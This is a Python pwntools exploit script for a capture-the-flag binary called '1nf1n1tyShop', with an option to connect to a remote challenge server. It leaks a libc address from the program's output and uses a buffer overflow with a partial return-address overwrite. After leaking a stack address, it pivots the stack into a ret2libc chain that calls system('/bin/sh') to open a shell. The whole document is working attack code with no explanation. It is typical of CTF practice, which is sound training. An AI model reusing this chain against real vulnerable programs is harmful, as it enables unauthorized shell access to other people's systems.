from pwn import *
from icecream import ic

elf = exe = ELF("./1nf1n1tyShop_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = False

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("pwn.1nf1n1ty.team", 31798)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x1260
pie b 0x133d
pie b 0x144d
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a, drop = True)
def rl(): return io.recvline()
def gad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def i(): return io.interactive()

io = start()

sl(b'hacker')
ru(b'>')
sl(b'4')
ru("Your prize: ")
libc.address = int(ru(";)"), 16) - libc.sym['system']

# ret = 0x0002244a
payload = b'a'*(172)
# payload += p32(ret)
payload += b'\xc7\x62'
# payload += p32(libc.address + 0x173af2)

sl(b'2')
ru(">")
s(payload)

payload = b'a'*24
s(payload)

ru("aaaaaaaaaaaaaaaaaaaaaaaa")
stack_leak = u32(ru("aaaaaaaa")) - 0xe4

sl(b'2')

pop_esp_ret = libc.address + 0x000b6e13

payload = b'a'*4
payload += p32(libc.sym['system'])
payload += p32(0)
payload += p32(next(libc.search(b'/bin/sh\x00')))
payload = payload.ljust(168, b'a')
payload += p32(stack_leak)
payload += p32(pop_esp_ret)
# payload += 

s(payload)
io.interactive()
